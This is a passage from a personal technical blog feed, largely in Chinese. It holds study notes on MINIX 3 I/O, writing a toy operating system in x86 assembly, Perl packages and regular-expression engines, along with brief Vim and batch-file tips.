class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs prolog">所有的类型名都以<span class="hljs-string">&quot;_t&quot;</span>结尾，这不仅是一种习惯，而且是<span class="hljs-symbol">POSIX</span>标准规定.<br><br>对于编译器，首字母大写的所有类型都等价于int类型.<br>### <span class="hljs-number">2.6</span><span class="hljs-number">.4</span> <span class="hljs-symbol">MINIX</span> <span class="hljs-number">3</span> 头文件<br>以下划线开头可以降低冲突的可能性.<br><br>对于磁盘的缓存来说，用于文件系统的缓存容量是越大越好.<br><br>声明被包含于两个以上的文件中，则有些链接程序将会把它认做变量多重定义错误.<br>### <span class="hljs-number">2.6</span><span class="hljs-number">.6</span> 引导<span class="hljs-symbol">MINIX</span> <span class="hljs-number">3</span><br>未分区磁盘，第一个扇区是引导块。<br><br>已分区磁盘，第一个扇区是主引导记录(含分区表)，又称主引导程序. 通常有且只有一个分区被表示为活动状态.<br><br>一个<span class="hljs-symbol">MINIX</span>分区与一个未分区的<span class="hljs-symbol">MINIX</span> <span class="hljs-number">3</span> 软盘结构相同.<br><br>在装入操作系统之前无法通过目录和文件名来定位一个文件.<br><br>通常<span class="hljs-string">`#include`</span>用来包含头文件, 但也可以用来选择源代码的适当部分.<br></code></pre></td></tr></table></figure><p>  #include &lt;minix&#x2F;config.h&gt;<br>  #if _WORD_SIZE &#x3D;&#x3D; 2<br>  #include “mpx88.s”<br>  #else<br>  #include “mpx386.s”<br>  #endif</p><pre><code class="hljs">在C语言中`a[i]`只是`*(a+i)`的另一种写法.## 3 Input/Output操作系统的主要功能之一是控制所有的输入/输出设备.### 3.1.1 I/O设备大致分为两类: 1. block device, 块设备 2. character device, 字符设备块设备将信息存储在固定大小的块中，每个块都有自己的地址。数据块的大小通常在512字节到32768字节之间。块设备的基本特征是每个块都能够独立于其他块而读写。磁盘是常用的块设备.字符设备发送或接受的是字符流，而不考虑任何块结构。字符设备无法编址，也不存在任何寻址操作。打印机、网络接口、鼠标以及大多数与磁盘不同的设备均可被视为字符设备.时钟的全部功能就是按照预先定义的时间间隔发出中断.文件系统仅仅控制抽象的块设备，而把与设备无关的部分留给较底层软件，即设备驱动程序(device driver)去处理。### 3.1.2 设备控制器I/O设备通常由一个机械部件和一个电子部件组成。电子部件称为 device controller，设备控制器或 adapter, 适配器. 机械部件则是设备本身.操作系统大多与控制器之间通信，而非设备本身.preamble，前导符是磁盘格式化时写进去的，他包括柱面数和扇区数、扇区大小之类的数据，还包括同步信息。在对检验和进行校验并证明数据快没有错误后，字节快将被复制到主存中.### 3.1.3 内存映射I/O每个控制器都有一些用来与CPU通信的寄存器。除了这些控制寄存器之外，许多设备还有一个操作系统可以读写的数据缓冲区.CPU与控制寄存器和设备的数据缓冲区进行通信的方法: 1. 分配I/O端口号, 内存和I/O的地址空间是不同的 2. 内存映射I/O, I/O寄存器是内存地址空间的一部分. 每个控制寄存器被分配唯一的一个内存地址，而且不会有内存分配这一地址. 通常分配给控制寄存器的地址位于地址空间的顶端.### 3.1.4 中断 p154</code></pre>]]></content>
    
    
    <categories>
      
      <category>Operate System</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Game Scripting Mastery Note</title>
    <link href="/2022/07/15/Game-Scripting-Mastery-Note/"/>
    <url>/2022/07/15/Game-Scripting-Mastery-Note/</url>
    
    <content type="html"><![CDATA[<h1 id="CHAPTER-1-AN-INTRODUCTION-TO-SCRIPTING"><a href="#CHAPTER-1-AN-INTRODUCTION-TO-SCRIPTING" class="headerlink" title="CHAPTER 1 AN INTRODUCTION TO SCRIPTING"></a>CHAPTER 1 AN INTRODUCTION TO SCRIPTING</h1><h2 id="WHAT-IS-SCRIPTING"><a href="#WHAT-IS-SCRIPTING" class="headerlink" title="WHAT IS SCRIPTING?"></a>WHAT IS SCRIPTING?</h2><h2 id="STRUCTURED-GAME-CONTENT-–-A-SIMPLE-APPROACH"><a href="#STRUCTURED-GAME-CONTENT-–-A-SIMPLE-APPROACH" class="headerlink" title="STRUCTURED GAME CONTENT – A SIMPLE APPROACH"></a>STRUCTURED GAME CONTENT – A SIMPLE APPROACH</h2><h2 id="IMPROVING-THE-METHOD-WITH-LOGICAL-AND-PHYSICAL-SEPARATION"><a href="#IMPROVING-THE-METHOD-WITH-LOGICAL-AND-PHYSICAL-SEPARATION" class="headerlink" title="IMPROVING THE METHOD WITH LOGICAL AND PHYSICAL SEPARATION"></a>IMPROVING THE METHOD WITH LOGICAL AND PHYSICAL SEPARATION</h2>]]></content>
    
    
    <categories>
      
      <category>Compiler Theory</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Using cd command in Vim</title>
    <link href="/2022/07/15/Using-cd-command-in-Vim/"/>
    <url>/2022/07/15/Using-cd-command-in-Vim/</url>
    
    <content type="html"><![CDATA[<p>You can use <code>cd</code> command in Vim.</p>]]></content>
    
    
    <categories>
      
      <category>Vim</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>The file with .bat postfix</title>
    <link href="/2022/07/13/The-file-with-bat-postfix/"/>
    <url>/2022/07/13/The-file-with-bat-postfix/</url>
    
    <content type="html"><![CDATA[<p><code>bat</code>文件是<code>dos</code>下的批处理文件，是无格式的文本文件，包含一条或多条命令。扩展名通常为<code>.bat</code>或<code>.cmd</code>, 就是脚本文件.</p>]]></content>
    
    
    <categories>
      
      <category>Skills</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Hex Editing in Vim</title>
    <link href="/2022/07/13/Hex-Editing-in-Vim/"/>
    <url>/2022/07/13/Hex-Editing-in-Vim/</url>
    
    <content type="html"><![CDATA[<p>Adding a plugin named ‘fidian hexmode’, you can see this in Github.</p>]]></content>
    
    
    <categories>
      
      <category>Skills</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>30天自制操作系统</title>
    <link href="/2022/07/13/30%E5%A4%A9%E8%87%AA%E5%88%B6%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"/>
    <url>/2022/07/13/30%E5%A4%A9%E8%87%AA%E5%88%B6%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/</url>
    
    <content type="html"><![CDATA[<h1 id="第1天-从计算机结构到汇编程序入门"><a href="#第1天-从计算机结构到汇编程序入门" class="headerlink" title="第1天 从计算机结构到汇编程序入门"></a>第1天 从计算机结构到汇编程序入门</h1><p>软盘的原理是把二进制的0和1转换为磁极的N极和S极.</p><p>不能仅以0和1来表达的内容，都不能以电信号的形式传递给CPU.</p><p><code>DB</code> 指令是”defined byte” 的缩写，也就是往文件里直接写入1个字节的指令.</p><p><code>RESB</code>指令是”reserve byte”的缩写，用于开辟字节内存.</p><p><code>$</code>这里指一个变量，告诉我们这一行现在的字节数.<br><mark>提问</mark><br>软盘的格式化是在干嘛.</p><h2 id="启动区"><a href="#启动区" class="headerlink" title="启动区"></a>启动区</h2><p>计算机读写软盘的时候是以512字节为一个单位进行读写，而不是一个字节一个字节地读写.</p><p>第一个扇区为启动区，会检查其最后两个字节的内容是否为<code>0x55AA</code>来确定这个扇区的开头是否为启动程序。</p><h2 id="IPL"><a href="#IPL" class="headerlink" title="IPL"></a>IPL</h2><p>Initial Program Loader的缩写。启动程序加载器。用于读入程序.</p><h2 id="启动"><a href="#启动" class="headerlink" title="启动"></a>启动</h2><p>boot，是bootstrap的缩写，有“自力更生完成任务”的含义。</p><p>矛盾的操作系统自动启动机制被称为bootstrap方式.</p><h1 id="第2天-汇编语言学习与Makefile入门"><a href="#第2天-汇编语言学习与Makefile入门" class="headerlink" title="第2天 汇编语言学习与Makefile入门"></a>第2天 汇编语言学习与Makefile入门</h1><p><code>ORG</code>指令，源于”origin”, 指明把这些机器语言指令装载到内存中的哪个地址.</p><p>8个代表性的寄存器的名称:</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-built_in">AX</span>    accumulator, 累加器<br><span class="hljs-built_in">CX</span>    counter, 计数寄存器<br><span class="hljs-built_in">DX</span>    data, 数据寄存器<br><span class="hljs-built_in">BX</span>    base, 基址寄存器<br><span class="hljs-built_in">SP</span>    stack pointer, 栈指针寄存器<br><span class="hljs-built_in">BP</span>    base pointer, 基址指针寄存器<br><span class="hljs-built_in">SI</span>    source index, 源变址寄存器<br><span class="hljs-built_in">DI</span>    destination index, 目的变址寄存器<br></code></pre></td></tr></table></figure><p>都是16位寄存器. 名称中的X表示扩展(extend)的意思，因为以前的寄存器是8位.</p><p>8个8位寄存器:</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-built_in">AL</span>    accumulator low, 累加寄存器低位<br><span class="hljs-built_in">CL</span>    counter low, 计数寄存器低位<br><span class="hljs-built_in">DL</span>    data low, 数据寄存器低位<br><span class="hljs-built_in">BL</span>    base low, 基质寄存器低位<br><span class="hljs-number">AH</span>    accumulator high, 累加寄存器高位<br><span class="hljs-number">CH</span>    count high, 计数寄存器低位<br><span class="hljs-number">DH</span>    data high, 数据寄存器低位<br><span class="hljs-number">BH</span>    base high, 基址寄存器低位<br></code></pre></td></tr></table></figure><p>电脑是32位的使用32位寄存器:</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-built_in">EAX</span>, <span class="hljs-built_in">ECX</span>, <span class="hljs-built_in">EDX</span>, <span class="hljs-built_in">EBX</span>, <span class="hljs-built_in">ESP</span>, EXP, <span class="hljs-built_in">ESI</span>, <span class="hljs-built_in">EDI</span><br></code></pre></td></tr></table></figure><p>在16位寄存器的名字前面加上一个E, 字母E来源于”Extend”.</p><p><code>EAX</code>的低16位就是<code>AX</code>但是高16位没有名称.</p><p>段寄存器，16位寄存器:</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-built_in">ES</span>    extra <span class="hljs-meta">segment</span>, 附加段寄存器<br><span class="hljs-built_in">CS</span>    code <span class="hljs-meta">segment</span>, 代码段寄存器<br><span class="hljs-built_in">SS</span>    stack <span class="hljs-meta">segment</span>, 栈段寄存器<br><span class="hljs-built_in">DS</span>    data <span class="hljs-meta">segment</span>, 数据段寄存器<br><span class="hljs-built_in">FS</span>    <span class="hljs-meta">segment</span> part <span class="hljs-number">2</span>, 没有名称<br><span class="hljs-built_in">ES</span>    <span class="hljs-meta">segment</span> part <span class="hljs-number">3</span>, 没有名称<br></code></pre></td></tr></table></figure><p>在汇编语言中，所有标号都仅仅是单纯的数字。每个标号对应的数字，是由汇编语言编译器根据ORG指令计算出来的。编译器计算出的”标号的地方对应的内存地址”就是那个标号的值.</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-keyword">MOV</span> <span class="hljs-built_in">SI</span>,msg<br></code></pre></td></tr></table></figure><p>这里的<code>msg</code>是一个标号, 实际上<code>SI</code>的值为标号代表的地址.</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-keyword">MOV</span> <span class="hljs-built_in">SI</span>,[msg]<br></code></pre></td></tr></table></figure><p><code>[]</code>表示内存.</p><h2 id="内存-Memory"><a href="#内存-Memory" class="headerlink" title="内存 Memory"></a>内存 Memory</h2><p>内存是CPU的外部存储器.</p><p>使用内存的速度慢很多.</p><p>BYTE, WORD, DWORD 都是汇编语言保留字. 相邻指的是地址增加方向的相邻.</p><p>只有BX, BP, SI, DI 可用于指定内存地址.</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-keyword">MOV</span> <span class="hljs-built_in">BX</span>, <span class="hljs-built_in">DX</span><br><span class="hljs-keyword">MOV</span> <span class="hljs-built_in">AL</span>, <span class="hljs-built_in">BYTE</span>[<span class="hljs-built_in">BX</span>]<br></code></pre></td></tr></table></figure><p>注意位数要相同. 违反这一规则的话，汇编语言就找不到相对应的机器语言.</p><p><code>CMP</code>指令和<code>JE</code>指令:</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-keyword">CMP</span> <span class="hljs-built_in">AL</span>,<span class="hljs-number">0</span><br><span class="hljs-keyword">JE</span> fin<br></code></pre></td></tr></table></figure><p><code>INT</code>指令是软件中断指令，源自”interrupt”.</p><p><code>BIOS</code>程序，”Basic Input Output System”，其中写入了操作系统开发人员常用的一些程序，位于电脑主板上的ROM单元里。</p><p>电脑的设定画面也在<code>BIOS</code>中.</p><p><code>HLT</code>指令，让CPU停止动作，但不彻底，即没断电，使其进入待机状态。只要外部状态变化，就会继续执行程序。其源自英文”halt”.</p><p>在内存的<code>0xf0000</code>号附近，还存放这BIOS程序本身.</p><p>0x00007c00-0x00007dff : 启动区内容的装载地址. 程序中ORG指令的值就是这个数字. 这个数字没有什么特别之处，只是最初的规定.</p><h1 id="第3天-进入32位模式并导入C语言"><a href="#第3天-进入32位模式并导入C语言" class="headerlink" title="第3天 进入32位模式并导入C语言"></a>第3天 进入32位模式并导入C语言</h1><p>调用BIOS中的程序是，其会根据寄存器中的值来作出相应的反应.</p><p>从外到内，柱面号增大。</p><p><code>C0-H0-S1</code> 柱面0, 磁头1, 扇区1.</p><h2 id="32位模式"><a href="#32位模式" class="headerlink" title="32位模式"></a>32位模式</h2><p>指CPU的模式，CPU有16位和32位两种模式。16位模式使用AX和CX等寄存器。32位使用EAX和ECX等寄存器。</p><p>16位和32位模式产生的机器语言的命令代码不一样。</p><p>CPU的自我保护功能在16位下不能使用.</p><p><code>VRAM</code>指显卡内存(vedio RAM).</p><p><code>goto</code>指令实际上会被编译成<code>JMP</code>指令.</p><p>C语言中不能使用<code>HLT</code>, 也没有相当与<code>DB</code>的命令.</p><p>gcc 是以 gas 汇编语言为基础.</p><p>目标文件是一种特殊的机器语言文件，必须与其他文件链接(link)后才能变成真正可以执行的机器语言.</p><p>C语言有一些局限性，不可能只用C语言来编写所有的程序，所以其中有一部分必须用汇编来写，然后链接到C语言写的程序上.</p><p><mark>映像文件</mark><br>大概是，不是文件本来的状态，而是一种替代形式. </p><h1 id="第4天-C语言与画面显示练习"><a href="#第4天-C语言与画面显示练习" class="headerlink" title="第4天 C语言与画面显示练习"></a>第4天 C语言与画面显示练习</h1><p>CPU(英特尔系列):</p><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs basic"><span class="hljs-symbol">8086 </span>-&gt; <span class="hljs-number">80186</span> -&gt; <span class="hljs-number">286</span> -&gt; <span class="hljs-number">386</span> -&gt; <span class="hljs-number">486</span> -&gt; Pentium -&gt; Per<br></code></pre></td></tr></table></figure><p>到286为止CPU是16位，386以后CPU是32位.</p><h2 id="挑战指针"><a href="#挑战指针" class="headerlink" title="挑战指针"></a>挑战指针</h2><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs arduino"><span class="hljs-type">char</span> *p;  <span class="hljs-comment">//用于BYTE类地址</span><br><span class="hljs-type">short</span> *p; <span class="hljs-comment">//用于WORD类地址</span><br><span class="hljs-type">int</span> *p; <span class="hljs-comment">//用于DWORD类地址</span><br></code></pre></td></tr></table></figure><p>但是，以上变量<code>p</code>都是4字节.</p><p><code>cast</code>在英文中的原意有压入模具，让材料成为某种特定的形状.</p>]]></content>
    
    
    <categories>
      
      <category>Operate System</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Programming Perl Notes</title>
    <link href="/2022/07/12/Programming-Perl-Notes/"/>
    <url>/2022/07/12/Programming-Perl-Notes/</url>
    
    <content type="html"><![CDATA[<h1 id="CHAPTER-10-Packages"><a href="#CHAPTER-10-Packages" class="headerlink" title="CHAPTER 10 Packages"></a>CHAPTER 10 Packages</h1><p>在Perl中, 命名空间称为包(package).</p><p>一个文件可以有多个包，一个包也可以跨多个文件。</p><p>若要在文件中放一个包，文件名需要和包名相同, 并使用<code>.pm</code>扩展名, 这是<code>perl module</code>的缩写。</p><p>模块(module)是Perl中可重用的基本单位。</p><p>若要使用模块，需要使用<code>use</code>命令，这是一个编译指令，可以控制从模块导入子例程和变量.</p><p>The typical class is implemented by a module that defines a package with the same name as the class.</p><p>重用的含义大概就是直接使用别人制作好的软件.</p><p><mark>the current package</mark><br>As Perl encounter a chunk of code, it is compiled into the current package. 初始的当前包 is called “main”.</p><p>当前包确定了要使用哪个符号表来查找变量，子例程，I&#x2F;O handles, and formats.</p><h2 id="Symbol-Tables"><a href="#Symbol-Tables" class="headerlink" title="Symbol Tables"></a>Symbol Tables</h2><p>包的内容统称为符号表(Symbol Table)</p>]]></content>
    
    
    <categories>
      
      <category>Perl</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Master Regular Expressions</title>
    <link href="/2022/07/08/Master-Regular-Expressions/"/>
    <url>/2022/07/08/Master-Regular-Expressions/</url>
    
    <content type="html"><![CDATA[<h1 id="1-Introduction-to-Regular-Expression"><a href="#1-Introduction-to-Regular-Expression" class="headerlink" title="1 Introduction to Regular Expression"></a>1 Introduction to Regular Expression</h1><h2 id="The-Language-Analogy"><a href="#The-Language-Analogy" class="headerlink" title="The Language Analogy"></a>The Language Analogy</h2><p>Full regular expressions are composed of two types of characters:</p><pre><code class="hljs">1. The special characters are called metacharacters2. The rest are called literal or normal text characters. </code></pre><p>文件名模式的元字符要少于正则表达式。</p><h2 id="单词分界符"><a href="#单词分界符" class="headerlink" title="单词分界符"></a>单词分界符</h2><p>在<code>egrep</code>分界符为<code>\&lt;</code>和<code>\&gt;</code>.</p><p>区分元字符和元字符序列，<code>&lt;</code>和<code>&gt;</code>本身不是元字符.</p><h2 id="流派"><a href="#流派" class="headerlink" title="流派"></a>流派</h2><p>指每样工具支持的元字符和其他特性各不相同.</p><h1 id="2-Extended-Introductory-Examples"><a href="#2-Extended-Introductory-Examples" class="headerlink" title="2 Extended Introductory Examples"></a>2 Extended Introductory Examples</h1><p>Perl 和 egrep 不属于同一个流派，而且 Perl 提供的元字符远远多于 egrep.</p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stata">% perl -<span class="hljs-keyword">One</span> &#x27;<span class="hljs-keyword">print</span> <span class="hljs-string">&quot;$ARGV\n&quot;</span> <span class="hljs-keyword">if</span> s/ResetSize<span class="hljs-comment">//ig != s/SetSize/ig&#x27; *</span><br></code></pre></td></tr></table></figure><p>在 Perl 中，变量不需要事先声明就能使用.</p><p>把<code>=~</code>读做match会比较省事。</p><p>Perl 一般不区分整数和浮点数.</p><h2 id="Adding-Commas-to-a-Number-with-Lookaround"><a href="#Adding-Commas-to-a-Number-with-Lookaround" class="headerlink" title="Adding Commas to a Number with Lookaround"></a>Adding Commas to a Number with Lookaround</h2><p>Lookaround match position within the text. 环视比 anchors 更通用.</p><p>Lookahead 从左向右查看文本. 是从head看，那就是从左往右.</p><p>Positive lookaround, 从左向右查看文本，查看当前位置右边。使用 special sequence <code>(?=...)</code>表示。</p><p>lookbehind, 从behind开始看，从右往左查看文本. 查看当前文本左边。Using special sequence <code>(?&lt;=...)</code>. 可以把<code>&lt;=</code>看作箭头指向左边所以匹配左侧.</p><p>环视表示的是找到一个位置并从这里开始匹配，如:</p><figure class="highlight lasso"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs lasso"><span class="hljs-params">...</span><span class="hljs-keyword">by</span> Jeffrey Friedl.<br></code></pre></td></tr></table></figure><p>使用<code>(?=Jeffrey)Jeff</code>, 即从<code>(?=Jeffrey)</code>一个字符的右边是<code>Jeffrey</code>的位置开始匹配<code>Jeff</code>. 也就是从<code>by</code>后面的那个空格字符开始匹配.</p><p>环视匹配的内容不是匹配文本.</p><figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs lisp">s/(?&lt;=\bJeff)(?=s\b)/&#x27;/g<br></code></pre></td></tr></table></figure><p>结合非捕获型括号:</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby">s/(<span class="hljs-string">?&lt;</span>=\d)(<span class="hljs-string">?=</span>(<span class="hljs-string">?:\d\d\d</span>)+<span class="hljs-variable">$)</span><br></code></pre></td></tr></table></figure><p>Negtive lookahead <code>(?!...)</code> 和 negtive lookbehind <code>(?&lt;!...)</code>, 就是把等号 <code>=</code> 换成了 <code>!</code> .</p><p>当 their subexpression is not able to match, 成功的位置. 即周围不是什么时匹配的位置.</p><p>可以处理一侧匹配，一侧不匹配的情况.</p><p>Using <code>(?&lt;!\w)(?=\w)|(?&lt;=\w)(?!\w)</code> as a replacement for <code>\b</code>.</p><h3 id="Commafication-without-lookbehind"><a href="#Commafication-without-lookbehind" class="headerlink" title="Commafication without lookbehind"></a>Commafication without lookbehind</h3><p>注意 Lookbehind is not as widely supported as lookahead.</p><h2 id="Text-to-HTML-转换"><a href="#Text-to-HTML-转换" class="headerlink" title="Text-to-HTML 转换"></a>Text-to-HTML 转换</h2><h1 id="3-Overview-of-Regular-Expression-Features-and-Flavors"><a href="#3-Overview-of-Regular-Expression-Features-and-Flavors" class="headerlink" title="3 Overview of Regular Expression Features and Flavors"></a>3 Overview of Regular Expression Features and Flavors</h1><p>“Global Regular Expression Print” 即 grep.</p><p>egrep 即 “extend grep”.</p><h2 id="POSIX-标准化的尝试"><a href="#POSIX-标准化的尝试" class="headerlink" title="POSIX 标准化的尝试"></a>POSIX 标准化的尝试</h2><p>POSIX 把常见的流派分为两大类:</p><pre><code class="hljs">1. Basic Regular Expresion (BREs)2. Extended Regular Expresion (EREs)</code></pre><p><code>PCRE</code> 正则表达式库。</p><h2 id="字符串，-字符编码和匹配模式"><a href="#字符串，-字符编码和匹配模式" class="headerlink" title="字符串， 字符编码和匹配模式"></a>字符串， 字符编码和匹配模式</h2><h3 id="作为正则表达式的字符串"><a href="#作为正则表达式的字符串" class="headerlink" title="作为正则表达式的字符串"></a>作为正则表达式的字符串</h3><p>除了 Perl, awk, sed 之外的大多数语言的正则引擎接收的是以普通字符串形式提供的正则表达式.</p><p>在字符串文字中，必须使用两个紧挨在一起的反斜线才能表示正则表达式中的反斜线。如为了表示正则表达式中的<code>\n</code>, 必须在字符串中使用<code>\\n</code>.</p><p>处理分为了两部分，语言的字符串处理和正则引擎处理.</p><h3 id="字符编码"><a href="#字符编码" class="headerlink" title="字符编码"></a>字符编码</h3><p>规定了不同数值的字节应该如何解释.</p><h4 id="Unicode"><a href="#Unicode" class="headerlink" title="Unicode"></a>Unicode</h4><p>It’s a logical mapping between a number and a character.</p><p>这里的 number 称为 code point 常为 hexadecimal 加上“U+” 在前面. 如<code>U+c0B5</code>.</p><h5 id="Characters-versus-combining-character-sequences"><a href="#Characters-versus-combining-character-sequences" class="headerlink" title="Characters versus combining-character sequences"></a>Characters versus combining-character sequences</h5><p>一个字符，可能由两个 code point 来表示. 一个 base character, 一个 combining character.</p><p>Unicode offers  a number of combining characters that are intended to follow a base character.</p><p>两个代码点的字符后面跟一个量词，量词可能作用与第二个代码点.</p><h1 id="4-The-Mechanics-of-Expression-Processing"><a href="#4-The-Mechanics-of-Expression-Processing" class="headerlink" title="4 The Mechanics of Expression Processing"></a>4 The Mechanics of Expression Processing</h1><h2 id="Regex-Engine-Types"><a href="#Regex-Engine-Types" class="headerlink" title="Regex Engine Types"></a>Regex Engine Types</h2><p>分为两类:<br>    1. DFA<br>    2. NFA</p><p>测试了一下，Vim使用的是传统型NFA. egrep 是DFA。</p><p>Two all-encompassing rules:<br>    1. The match that begins earliest (leftmost) wins.<br>    2. The standard quantifiers (*, +, ?, and {m,n}) are greedy.</p><p>如果不能在最开始的位置匹配成功，就会从字符串下一个位置重新开始匹配.</p><p>Backreference 只对NFA引擎有效.</p><p>DFA引擎匹配速度更快。</p><h2 id="Regex-Directed-Versus-Text-Directed"><a href="#Regex-Directed-Versus-Text-Directed" class="headerlink" title="Regex-Directed Versus Text-Directed"></a>Regex-Directed Versus Text-Directed</h2><p>The two basic engine types 反映了算法的差异.</p><p>NFA engine “regex-directed”.</p><p>DFA engine “text-directed”.</p><h3 id="First-Thoughts-NFA-and-DFA-in-Comparison"><a href="#First-Thoughts-NFA-and-DFA-in-Comparison" class="headerlink" title="First Thoughts: NFA and DFA in Comparison"></a>First Thoughts: NFA and DFA in Comparison</h3><p>NFA, Nondeterministic Finite Automaton, 字符串中的字符可能会匹配多次。</p><p>DFA, Deterministic Finite Automaton, 字符串中的字符只会匹配一次.</p><p>不同的表达式会以不同的方式控制引擎.</p><p>DFA keeps track of all matches simultaneously.</p><h3 id="Backtracking"><a href="#Backtracking" class="headerlink" title="Backtracking"></a>Backtracking</h3><p>It’s the essence of an NFA engine. 在面临作出选择的情形是会记住未选的结构. 如量词和多选结构(|).</p><h4 id="Two-Important-Points-on-Backtracking"><a href="#Two-Important-Points-on-Backtracking" class="headerlink" title="Two Important Points on Backtracking"></a>Two Important Points on Backtracking</h4><p>   1.The engine always choose to first make the attempt for greedy quantifiers, and to first skip the attempt for lazy ones. 当量词是greedy时，会尝试匹配，是lazy时会跳过.<br>   2.The most recently saved option is the one returned to when a local failure forces backtracking. They’re used LIFO(last in first out).</p><h3 id="Saved-State"><a href="#Saved-State" class="headerlink" title="Saved State"></a>Saved State</h3><p>This is the basis for NFA matching.</p><p>greedy 量词和 lazy 量词的保存状态不同. 前者在量词作用的pattern后面，后者在前面.</p><h3 id="Backtracking-and-Greediness"><a href="#Backtracking-and-Greediness" class="headerlink" title="Backtracking and Greediness"></a>Backtracking and Greediness</h3><h4 id="Star-plus-and-their-backtracking"><a href="#Star-plus-and-their-backtracking" class="headerlink" title="Star, plus, and their backtracking"></a>Star, plus, and their backtracking</h4><p>每测试一项都会保留一个状态.</p><p>需注意:<br>    1. Backtracking 机制不但需要重新计算正则表达式和文本的对应位置，也需要维护括号内的子表达式所匹配的文本状态.<br>    2. 星号(或其他人和greedy量词)限定的部分不受后面元素的影响，而是匹配尽可能多的内容.</p><p>DFA 只有 greedy 的量词.</p><h3 id="Problem-of-Greediness"><a href="#Problem-of-Greediness" class="headerlink" title="Problem of Greediness"></a>Problem of Greediness</h3><p>不要过分依赖<code>.*</code>, 可能会出问题.</p><p>忽略量词有时可以替代排除类.</p><p>使用排除环视，可以得到与排除型字符组相当的结果.</p><h3 id="The-Essence-of-Greediness-Laziness-and-Backtracing"><a href="#The-Essence-of-Greediness-Laziness-and-Backtracing" class="headerlink" title="The Essence of Greediness, Laziness, and Backtracing"></a>The Essence of Greediness, Laziness, and Backtracing</h3><p>在匹配失败后，就会尝试另外的分支.</p><p>无论是匹配优先还是忽略优先，只要引擎报告匹配失败，它就必然尝试了所有的可能.</p><p>匹配优先和忽略优先区别于测试路径的先后顺序。</p><h3 id="Possessive-Quantifiers-and-Atomic-Grouping"><a href="#Possessive-Quantifiers-and-Atomic-Grouping" class="headerlink" title="Possessive Quantifiers and Atomic Grouping"></a>Possessive Quantifiers and Atomic Grouping</h3><h4 id="Atomic-grouping-with-gt-…"><a href="#Atomic-grouping-with-gt-…" class="headerlink" title="Atomic grouping with (?&gt;…)"></a>Atomic grouping with (?&gt;…)</h4><p>Atomic grouping 即放弃其中的 saved state. </p><h4 id="The-essence-of-atomic-grouping"><a href="#The-essence-of-atomic-grouping" class="headerlink" title="The essence of atomic grouping"></a>The essence of atomic grouping</h4><p>匹配优先和忽略优先都不会影响需要检测路径的本身，而只会影响检测的顺序。如果不能匹配，无论是匹配优先还是忽略优先的顺序，最终每条路径都会被测试.</p><h4 id="Possessive-Quantifiers-and-m-n"><a href="#Possessive-Quantifiers-and-m-n" class="headerlink" title="Possessive Quantifiers, ?+, *+, ++, and {m,n}+"></a>Possessive Quantifiers, <code>?+, *+, ++, and &#123;m,n&#125;+</code></h4><p>Possessive quantifiers are much like greedy quantifiers 但是它们从不交还已经匹配的字符.</p><p>每当做选择时都会创建 saved state.</p><p>Possessive quantifiers 不会创建 saved state.</p><h3 id="The-Backtracking-of-Lookaround"><a href="#The-Backtracking-of-Lookaround" class="headerlink" title="The Backtracking of Lookaround"></a>The Backtracking of Lookaround</h3><p>Lookaround is closely related to atomic grouping and possessive quantifiers.</p><p>There are four types of lookaround:</p><pre><code class="hljs">1. positive2. negetive   flavors of lookahead and lookbehind</code></pre><p>在NFA的世界中包含了 saved state 和 backtracking.</p><p>只要环视结构的匹配尝试结束，它就不会留下任何 saved state.</p><h3 id="Is-Alternation-Greedy"><a href="#Is-Alternation-Greedy" class="headerlink" title="Is 